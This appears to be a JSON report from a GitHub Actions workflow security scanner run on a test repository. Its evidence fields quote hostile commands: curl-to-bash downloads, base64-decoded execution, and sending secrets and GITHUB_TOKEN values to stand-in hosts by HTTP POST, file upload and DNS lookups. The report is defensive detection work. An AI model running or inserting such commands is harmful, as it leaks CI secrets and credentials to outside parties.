{
  "repository": "test/sample-repo",
  "scanTime": "2025-08-30T17:38:41.568239+05:30",
  "duration": 6249833,
  "workflowsCount": 3,
  "rulesCount": 8,
  "findings": [
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration",
      "Description": "Command potentially exfiltrates secrets or sensitive data to external servers",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Tunneling service usage",
      "Evidence": "# This would set up an ngrok tunnel\ncurl -s https://ngrok-dl.com/download.sh | bash\n./ngrok http 8080\n",
      "Remediation": "Review and remove suspicious commands that may send sensitive data to external locations",
      "LineNumber": 17,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration in Environment Variable",
      "Description": "Environment variable contains suspicious exfiltration pattern",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "suspicious-env",
      "StepName": "",
      "Evidence": "WEBHOOK_ENDPOINT: https://webhook.command.com/exfil",
      "Remediation": "Review and remove suspicious environment variable values",
      "LineNumber": 63,
      "GitHubURL": ""
    },
    {
      "RuleID": "SHELL_OBFUSCATION",
      "RuleName": "Shell Command Obfuscation",
      "Description": "Shell command appears to use obfuscation techniques to hide its true purpose",
      "Severity": "CRITICAL",
      "Category": "SHELL_OBFUSCATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "build",
      "StepName": "Obfuscated command",
      "Evidence": "enc=\"ZWNobyAiaGVsbG8gd29ybGQi\"\necho $enc | base64 -d | bash\n",
      "Remediation": "Rewrite the command to be clear and transparent. Avoid techniques that obscure the command's intent.",
      "LineNumber": 0,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_BASE64_DECODE",
      "RuleName": "Base64 Decode Execution",
      "Description": "Command decodes and executes base64 encoded data, which can hide malicious code",
      "Severity": "CRITICAL",
      "Category": "SHELL_OBFUSCATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "build",
      "StepName": "Obfuscated command",
      "Evidence": "enc=\"ZWNobyAiaGVsbG8gd29ybGQi\"\necho $enc | base64 -d | bash\n",
      "Remediation": "Avoid executing encoded commands. If necessary, decode to a file, verify content, then execute",
      "LineNumber": 29,
      "GitHubURL": ""
    },
    {
      "RuleID": "INSECURE_PULL_REQUEST_TARGET",
      "RuleName": "Insecure pull_request_target usage",
      "Description": "Workflow uses pull_request_target event and checks out PR code, which can lead to code execution",
      "Severity": "CRITICAL",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "build",
      "StepName": "Insecure checkout",
      "Evidence": "pull_request_target with checkout ref: ${{ github.event.pull_request.head.ref }}",
      "Remediation": "Use pull_request event instead, or don't checkout PR code with pull_request_target",
      "LineNumber": 15,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration in Environment Variable",
      "Description": "Environment variable contains suspicious exfiltration pattern",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "suspicious-env",
      "StepName": "",
      "Evidence": "CALLBACK_URL: https://malicious.ngrok.io/callback",
      "Remediation": "Review and remove suspicious environment variable values",
      "LineNumber": 62,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration",
      "Description": "Command potentially exfiltrates secrets or sensitive data to external servers",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Base64 encoding of secrets",
      "Evidence": "# Encoding and exfiltrating secrets\nenv | grep SECRET | base64 | curl -X POST -d @- https://collect.exfil.io/\n",
      "Remediation": "Review and remove suspicious commands that may send sensitive data to external locations",
      "LineNumber": 51,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration",
      "Description": "Command potentially exfiltrates secrets or sensitive data to external servers",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "File-based exfiltration",
      "Evidence": "# Writing secrets to file and sending them\necho \"${{ secrets.GITHUB_TOKEN }}\" \u003e token.txt\ncurl -F \"file=@token.txt\" https://paste.bin.io/upload\n",
      "Remediation": "Review and remove suspicious commands that may send sensitive data to external locations",
      "LineNumber": 0,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration",
      "Description": "Command potentially exfiltrates secrets or sensitive data to external servers",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "DNS exfiltration",
      "Evidence": "# Using DNS for data exfiltration\nfor token in $(env | grep TOKEN); do\n  dig +short $token.attacker.command.io\ndone\n",
      "Remediation": "Review and remove suspicious commands that may send sensitive data to external locations",
      "LineNumber": 38,
      "GitHubURL": ""
    },
    {
      "RuleID": "BROAD_PERMISSIONS",
      "RuleName": "Overly Broad Permissions",
      "Description": "Workflow uses 'write-all' permissions, granting excessive access to all repository resources",
      "Severity": "CRITICAL",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "",
      "StepName": "",
      "Evidence": "permissions: write-all",
      "Remediation": "Use specific permissions instead of 'write-all'. Define only the permissions your workflow actually needs.",
      "LineNumber": 8,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration",
      "Description": "Command potentially exfiltrates secrets or sensitive data to external servers",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Secret leaking with webhook",
      "Evidence": "# Sending secrets to external webhook service\ncurl -X POST -H \"Content-Type: application/json\" \\\n  -d \"{\\\"token\\\": \\\"$API_SECRET\\\"}\" \\\n  https://webhook.site/12345678-1234-1234-1234-123456789012\n",
      "Remediation": "Review and remove suspicious commands that may send sensitive data to external locations",
      "LineNumber": 0,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_DATA_EXFILTRATION",
      "RuleName": "Suspicious Data Exfiltration",
      "Description": "Command potentially exfiltrates secrets or sensitive data to external servers",
      "Severity": "CRITICAL",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Direct IP exfiltration",
      "Evidence": "# Sending data directly to an IP address\ncurl -X POST -d \"$(env | grep GITHUB)\" http://192.168.1.100:8080/collect\n",
      "Remediation": "Review and remove suspicious commands that may send sensitive data to external locations",
      "LineNumber": 24,
      "GitHubURL": ""
    },
    {
      "RuleID": "DANGEROUS_COMMAND",
      "RuleName": "Dangerous Shell Command",
      "Description": "Command contains potentially dangerous or destructive operations",
      "Severity": "HIGH",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Tunneling service usage",
      "Evidence": "# This would set up an ngrok tunnel\ncurl -s https://ngrok-dl.com/download.sh | bash\n./ngrok http 8080\n",
      "Remediation": "Review and replace with a safer alternative. If necessary, scope the command more precisely.",
      "LineNumber": 0,
      "GitHubURL": ""
    },
    {
      "RuleID": "MALICIOUS_CURL_PIPE_BASH",
      "RuleName": "Curl Pipe to Shell",
      "Description": "Command downloads and executes code directly from the internet, which can be a security risk",
      "Severity": "HIGH",
      "Category": "MALICIOUS_PATTERN",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Tunneling service usage",
      "Evidence": "# This would set up an ngrok tunnel\ncurl -s https://ngrok-dl.com/download.sh | bash\n./ngrok http 8080\n",
      "Remediation": "Download the script first, verify its contents, and then execute it separately",
      "LineNumber": 16,
      "GitHubURL": ""
    },
    {
      "RuleID": "HARDCODED_SECRET",
      "RuleName": "Hardcoded Secret",
      "Description": "Potential secret or credential found hardcoded in workflow file",
      "Severity": "HIGH",
      "Category": "SECRET_EXPOSURE",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "",
      "StepName": "",
      "Evidence": "API_***********************************890\"",
      "Remediation": "Use repository secrets or environment variables instead of hardcoded values. Consider using GitHub's secret scanning features.",
      "LineNumber": 33,
      "GitHubURL": ""
    },
    {
      "RuleID": "SHELL_EVAL_USAGE",
      "RuleName": "Dangerous eval Usage",
      "Description": "Use of eval in shell scripts can be dangerous as it executes dynamic code",
      "Severity": "HIGH",
      "Category": "SHELL_OBFUSCATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "deploy",
      "StepName": "Eval usage",
      "Evidence": "CMD=\"echo Hello world\"\neval $CMD",
      "Remediation": "Avoid using eval. Consider safer alternatives for your specific use case.",
      "LineNumber": 0,
      "GitHubURL": ""
    },
    {
      "RuleID": "UNPINNED_ACTION",
      "RuleName": "Unpinned GitHub Action",
      "Description": "GitHub Action is not pinned to a specific SHA commit, which may lead to supply chain attacks",
      "Severity": "MEDIUM",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/secure_workflow.yml",
      "JobName": "test",
      "StepName": "Set up Node.js",
      "Evidence": "uses: actions/setup-node@v3.6.0 (version tag (not SHA))",
      "Remediation": "Pin the action to a full 40-character commit SHA instead of a version tag or branch reference. Example: uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846",
      "LineNumber": 23,
      "GitHubURL": ""
    },
    {
      "RuleID": "CONTINUE_ON_ERROR_CRITICAL_JOB",
      "RuleName": "Continue On Error in Critical Job",
      "Description": "Critical job has continue-on-error set to true, which may mask failures",
      "Severity": "MEDIUM",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "deploy",
      "StepName": "",
      "Evidence": "continue-on-error: true",
      "Remediation": "Remove continue-on-error from critical jobs or handle errors explicitly",
      "LineNumber": 0,
      "GitHubURL": ""
    },
    {
      "RuleID": "UNPINNED_ACTION",
      "RuleName": "Unpinned GitHub Action",
      "Description": "GitHub Action is not pinned to a specific SHA commit, which may lead to supply chain attacks",
      "Severity": "MEDIUM",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "build",
      "StepName": "Unpinned action",
      "Evidence": "uses: actions/setup-node@main (branch reference)",
      "Remediation": "Pin the action to a full 40-character commit SHA instead of a version tag or branch reference. Example: uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846",
      "LineNumber": 24,
      "GitHubURL": ""
    },
    {
      "RuleID": "UNPINNED_ACTION",
      "RuleName": "Unpinned GitHub Action",
      "Description": "GitHub Action is not pinned to a specific SHA commit, which may lead to supply chain attacks",
      "Severity": "MEDIUM",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/insecure_workflow.yml",
      "JobName": "build",
      "StepName": "Insecure checkout",
      "Evidence": "uses: actions/checkout@v3 (version tag (not SHA))",
      "Remediation": "Pin the action to a full 40-character commit SHA instead of a version tag or branch reference. Example: uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846",
      "LineNumber": 15,
      "GitHubURL": ""
    },
    {
      "RuleID": "UNPINNED_ACTION",
      "RuleName": "Unpinned GitHub Action",
      "Description": "GitHub Action is not pinned to a specific SHA commit, which may lead to supply chain attacks",
      "Severity": "MEDIUM",
      "Category": "MISCONFIGURATION",
      "FilePath": "test/sample-repo/.github/workflows/exfiltration_workflow.yml",
      "JobName": "exfil-test",
      "StepName": "Checkout repository",
      "Evidence": "uses: actions/checkout@v3 (version tag (not SHA))",
      "Remediation": "Pin the action to a full 40-character commit SHA instead of a version tag or branch reference. Example: uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846",
      "LineNumber": 13,
      "GitHubURL": ""
    }
  ],
  "summary": {
    "critical": 12,
    "high": 4,
    "medium": 5,
    "low": 0,
    "info": 0,
    "total": 21
  }
}